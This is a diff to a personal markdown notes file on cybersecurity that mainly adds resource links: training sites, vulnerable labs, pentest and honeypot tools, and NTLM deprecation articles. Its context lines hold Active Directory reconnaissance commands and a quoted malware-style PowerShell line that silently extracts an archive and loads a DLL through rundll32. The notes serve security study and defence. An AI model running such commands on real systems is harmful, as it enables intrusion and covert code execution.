@@ -2,7 +2,7 @@
 title: Cyber Security
 description: ""
 created: 2022-12-31
-updated: 2025-01-09
+updated: 2025-07-06
 tags:
   - security
 ---
@@ -31,7 +31,10 @@ Cyber security targets online threats while information security takes a holisti
 [carpedm20/awesome-hacking: A curated list of awesome Hacking tutorials, tools and resources](https://github.com/carpedm20/awesome-hacking)
 [onlurking/awesome-infosec: A curated list of awesome infosec courses and training resources.](https://github.com/onlurking/awesome-infosec)
 
+[All Hacking Cons - YouTube](https://www.youtube.com/@AllHackingCons)
 [DEFCONConference - YouTube](https://www.youtube.com/@DEFCONConference)
+[Black Hat - YouTube](https://www.youtube.com/@BlackHatOfficialYT)
+[Cybernews - YouTube](https://www.youtube.com/@cybernews)
 
 NetworkChuck
 [FREE Security+ SY0-601 // Complete Course // thisisIT 2020 - YouTube](https://www.youtube.com/playlist?list=PLIhvC56v63IIyU0aBUed4qwP0nSCORAdB)
@@ -173,10 +176,21 @@ The focus of the last 3 stages is _DETECTION and RESPONSE_.
 - Low risk scan
 - Runtime scan
 
+[Open Source Security Foundation – Linux Foundation Projects](https://openssf.org/)
+[OpenSSF Scorecard](https://securityscorecards.dev/)
+
 [Security as Code Protects Rapidly Developing Cloud Native Architectures - The New Stack](https://thenewstack.io/security-as-code-protects-rapidly-developing-cloud-native-architectures/)
 [Product | Security as Code - oak9](https://oak9.io/product/security-as-code/)
 
 [DevSecOps Tools | Atlassian](https://www.atlassian.com/devops/devops-tools/devsecops-tools)
+
+### Homograph Attack
+
+> [[unicode]]
+> sometimes the glphys of different characters look alike
+
+[Faux Cyrillic - Wikiwand](https://www.wikiwand.com/en/Faux_Cyrillic)
+[IDN homograph attack - Wikiwand](https://www.wikiwand.com/en/IDN_homograph_attack)
 
 ## Incidence Response
 
@@ -200,6 +214,8 @@ The focus of the last 3 stages is _DETECTION and RESPONSE_.
 
 [Hack The Box: Hacking Training For The Best | Individuals & Companies](https://www.hackthebox.com/)
 [hack the box - YouTube](https://www.youtube.com/watch?v=4CJMpZfK1rI)
+
+[Learn to Hack](https://www.hacksplaining.com/)
 
 [An Interactive Cyber Security Platform | Defend the Web](https://defendtheweb.net/) originally HackThis!!
 
@@ -232,6 +248,7 @@ The focus of the last 3 stages is _DETECTION and RESPONSE_.
 [CurtinX: Cybersecurity and Privacy in the IoT | edX](https://www.edx.org/learn/cybersecurity/curtin-university-cybersecurity-and-privacy-in-the-iot)
 
 [Ethical Hacking Full Course - Learn Ethical Hacking in 10 Hours | Ethical Hacking Tutorial | Edureka - YouTube](https://www.youtube.com/watch?v=dz7Ntp7KQGA)
+[Ethical hacking course 11 hours | Beginner edition | ethical hacker training course - YouTube](https://www.youtube.com/watch?v=xI-_dwTO608)
 
 [HackOvert - YouTube](https://www.youtube.com/@HackOvert)
 [InsiderPhD - YouTube](https://www.youtube.com/@InsiderPhD)
@@ -368,6 +385,8 @@ https://www.comptia.org/certifications/security
 [PentesterAcademy Labs - YouTube](https://www.youtube.com/playlist?list=PLzKIBgD3ky23LVO6MVy54mQo3IuzdkNq5)
 [Pentester Academy Blog](https://blog.pentesteracademy.com/)
 
+[Pentest Everything | Pentest Everything](https://viperone.gitbook.io/pentest-everything)
+
 [Cybersecurity Labs (FOR FREE) - Linux Backdoor Analysis - YouTube](https://www.youtube.com/watch?v=wt_dkZ8DDzw)
 [IntroLabs/IntroClassFiles/navigation.md at master · strandjs/IntroLabs](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/navigation.md)
 [ClassLabs/navigation.md at main · strandjs/ClassLabs](https://github.com/strandjs/ClassLabs/blob/main/navigation.md)
@@ -494,6 +513,8 @@ Server and client (support up to 1.1 of the TAXII standard)
 [CrowdSec - The open-source & collaborative security suite](https://www.crowdsec.net/)
 [How to Install and Configure CrowdSec on OPNsense](https://homenetworkguy.com/how-to/install-and-configure-crowdsec-on-opnsense/)
 
+[oisd | domain blocklist](https://oisd.nl/)
+
 #### Suricata
 
 [Home - Suricata](https://suricata.io/)
@@ -606,6 +627,9 @@ sudo suricata-update   # Do not forget to update rules after activating source
 [Open Source & Software Supply Chain Risks Blog | Synopsys](https://www.synopsys.com/blogs/software-security/category/open-source-and-software-supply-chain-risks/)
 [Snyk Vulnerability Database | Snyk](https://security.snyk.io/)
 
+[Home · Sigstore](https://www.sigstore.dev/)
+[sigstore/rekor: Software Supply Chain Transparency Log](https://github.com/sigstore/rekor)
+
 [npm audit: Broken by Design — Overreacted](https://overreacted.io/npm-audit-broken-by-design/) audit tools should not cause noise
 
 ## Social Engineering
@@ -624,11 +648,18 @@ sudo suricata-update   # Do not forget to update rules after activating source
 
 ## Cybersec Tools
 
+[Build Your AI-Powered Penetration Testing Scheme with DeepSeek + Agent: An NSFOCUS Practice - NSFOCUS, Inc., a global network and cyber security leader, protects enterprises and carriers from advanced cyber attacks.](https://nsfocusglobal.com/build-your-ai-powered-penetration-testing-scheme-with-deepseek-agent-an-nsfocus-practice/)
+
+[Every HACKING TOOL Explained in 5 minutes. - YouTube](https://www.youtube.com/watch?v=5une30fIDww)
 [The Tool Box - YouTube](https://www.youtube.com/playlist?list=PLzKIBgD3ky23HMXMZj6zbH9WANSeoy-Ju)
 [19 open source GitHub projects for security pros | InfoWorld](http://www.infoworld.com/article/3051771/security/19-open-source-github-projects-for-security-pros.html)
 
+[33 open-source cybersecurity solutions you didn’t know you needed - Help Net Security](https://www.helpnetsecurity.com/2024/09/10/open-source-cybersec-tools/)
+[Don't let these open-source cybersecurity tools slip under your radar - Help Net Security](https://www.helpnetsecurity.com/2025/01/27/open-source-cybersecurity-tools-free/)
+
 [penetration testing - freeCodeCamp.org](https://www.freecodecamp.org/news/tag/penetration-testing/)
 [Tib3rius/Pentest-Cheatsheets](https://github.com/Tib3rius/Pentest-Cheatsheets/)
+[Soldie/Yuki-Chan-The-Auto-Pentest](https://github.com/Soldie/Yuki-Chan-The-Auto-Pentest)
 
 [Conduct a Penetration Test Like a Pro in 6 Phases [Tutorial] - YouTube](https://www.youtube.com/watch?v=8a1yTN2kFNw)
 
@@ -640,7 +671,8 @@ sudo suricata-update   # Do not forget to update rules after activating source
 
 [Commando VM: The First of Its Kind Windows Offensive Distribution | Mandiant | Google Cloud Blog](https://cloud.google.com/blog/topics/threat-intelligence/commando-vm-windows-offensive-distribution)
 
-[Soldie/Yuki-Chan-The-Auto-Pentest](https://github.com/Soldie/Yuki-Chan-The-Auto-Pentest)
+[Syslifters/sysreptor: A customizable and powerful penetration testing reporting platform for offensive security professionals. Simplify, customize, and automate your pentest reports with ease.](https://github.com/Syslifters/sysreptor)
+[SysReptor: Open-source penetration testing reporting platform - Help Net Security](https://www.helpnetsecurity.com/2025/02/12/sysreptor-open-source-penetration-testing-reporting-platform/)
 
 [Goby— 资产绘测及实战化漏洞扫描工具](https://gobies.org/) asset scan, PoC
 [MY0723/goby-poc: 451个goby poc，是否后门及重复自行判断，来源于网络收集的Goby&POC，不定时更新。](https://github.com/MY0723/goby-poc)
@@ -786,6 +818,9 @@ sudo suricata-update   # Do not forget to update rules after activating source
 [Project Heisenberg](https://www.rapid7.com/research/project-heisenberg/)
 [GHH - The "Google Hack" Honeypot](https://ghh.sourceforge.net/)
 [NozomiNetworks/pywinbox](https://github.com/NozomiNetworks/pywinbox)
+
+[referefref/ssh-honey-gateway: A simple SSH gateway for deception deployments](https://github.com/referefref/ssh-honey-gateway/)
+[droberson/ssh-honeypot: Fake sshd that logs ip addresses, usernames, and passwords.](https://github.com/droberson/ssh-honeypot)
 
 [Building an IoT Honeypot in 5 Steps](https://www.nozominetworks.com/blog/how-to-build-an-iot-honeypot)
 
@@ -979,6 +1014,7 @@ Workload id, service id
 [The Death of the Corporate Network](https://auth0.com/blog/the-death-of-the-corporate-network/)
 [Architecting Network Connectivity for a Zero Trust Future | Twingate](https://www.twingate.com/blog/network-connectivity-for-zero-trust/)
 [Why Access Management Is Step One for Zero Trust Security – The New Stack](https://thenewstack.io/why-access-management-is-step-one-for-zero-trust-security/)
+[Zero Trust Data Exchange: Overview & Benefits](https://www.kiteworks.com/risk-compliance-glossary/zero-trust-data-exchange/)
 
 [Guest Blog: k8s tunnels with Kudelski Security](https://blog.cloudflare.com/guest-blog-zero-trust-access-kubernetes/)
 
@@ -1210,6 +1246,8 @@ Low Level Learning
 [Vulhub - Docker-Compose file for vulnerability environment](https://vulhub.org/)
 [vulhub/vulhub: Pre-Built Vulnerable Environments Based on Docker-Compose](https://github.com/vulhub/vulhub)
 
+[Vulnerable By Design ~ VulnHub](https://www.vulnhub.com/)
+
 [cider-security-research/cicd-goat: A deliberately vulnerable CI/CD environment. Learn CI/CD security through multiple challenges.](https://github.com/cider-security-research/cicd-goat#Take-the-challenge)
 
 [zhuifengshaonianhanlu/pikachu: 一个好玩的Web安全-漏洞测试平台](https://github.com/zhuifengshaonianhanlu/pikachu)
@@ -1220,8 +1258,10 @@ Low Level Learning
 [Fortifying Your Organization Against AI-Driven Injection Attacks](https://www.itprotoday.com/vulnerabilities-threats/fortifying-your-organization-against-ai-driven-injection-attacks)
 
 [Now Scammers Are Sending Bank-Draining Malware Through Snail Mail: Here's How](https://www.makeuseof.com/scammers-bank-draining-malware-snail-mail/)
+[AI and Serious Online Crime | Centre for Emerging Technology and Security](https://cetas.turing.ac.uk/publications/ai-and-serious-online-crime)
 
 [Countdown to GovWare 2023 - The Application of Artificial Intelligence (AI) in Cybersecurity - NSFOCUS, Inc., a global network and cyber security leader, protects enterprises and carriers from advanced cyber attacks.](https://nsfocusglobal.com/countdown-to-govware-2023-the-application-of-artificial-intelligence-ai-in-cybersecurity/#Attack_Preparation)
+[Agentic AI Paves the Way for Sophisticated Cyberattacks](https://aibusiness.com/generative-ai/agentic-ai-paves-the-way-for-sophisticated-cyberattacks)
 
 [CyberNative/CyberBase-13b · Hugging Face](https://huggingface.co/CyberNative/CyberBase-13b)
 
@@ -1505,7 +1545,6 @@ Password Spray
 invoke phantom disables eeeeeee Event Logs
 DCSync, DCShadow
 NTLM hash\* (Pass The Hash attack), LM hash
-[Generate an NTLM Hash - NTLM Password - Online - Browserling Web Developer Tools](https://www.browserling.com/tools/ntlm-hash)
 
 enterprise admin, KRBTGT ticket (Kerberoast), skeleton key, password access key, DSRM
 domain admin
@@ -1524,6 +1563,13 @@ net group HQ_Desktop_admin /do
 nltest /dclist:astri.local
 nltest /server:ASPDC02 /domain_trusts
 ```
+
+## NTLM
+
+[The evolution of Windows authentication | Windows IT Pro Blog](https://techcommunity.microsoft.com/blog/windows-itpro-blog/the-evolution-of-windows-authentication/3926848) deprecating NLTM
+[Disable NTLM authentication on Windows Server 2025 – 4sysops](https://4sysops.com/archives/disable-ntlm-authentication-on-windows-server-2025/)
+
+[Generate an NTLM Hash - NTLM Password - Online - Browserling Web Developer Tools](https://www.browserling.com/tools/ntlm-hash)
 
 ## PHP
 
@@ -1714,6 +1760,7 @@ Many provide free service for open source projects
 [Dependency management + Code analytics for Node.js projects](https://www.bithound.io/)
 [Codacy | The fastest static analysis tool from setup to first analysis | Codacy](https://www.codacy.com/)
 [Code Quality and Code Security | SonarQube](https://www.sonarqube.org/)
+[Open Source Insights](https://deps.dev/)
 
 [Snyk | Developer Security | Develop Fast. Stay Secure.](https://snyk.io/)
 [snyk - npm](https://www.npmjs.com/package/snyk)
@@ -1772,6 +1819,13 @@ npm audit
 ```powershell
 C:\Windows\System32\cmd.exe /c powershell -WindowStyle Hidden -Command ".\7za.exe x archive.7z -pFhu$$57csa -o\"c:\programdata\" -y > $null; rundll32 c:\programdata\19a.dll,oxgdXPSGPw
 ```
+
+### Windows DLL hijacking
+
+[are built-in windows programs vulnerable? - YouTube](https://www.youtube.com/watch?v=uY8BpZBF2f0)
+[HijackLibs](https://hijacklibs.net/)
+[cyberark/DLLSpy: DLL Hijacking Detection Tool](https://github.com/cyberark/DLLSpy)
+[redteamsocietegenerale/DLLirant: DLLirant is a tool to automatize the DLL Hijacking researches on a specified binary.](https://github.com/redteamsocietegenerale/DLLirant)
 
 ### Obfuscation/Evasion
 
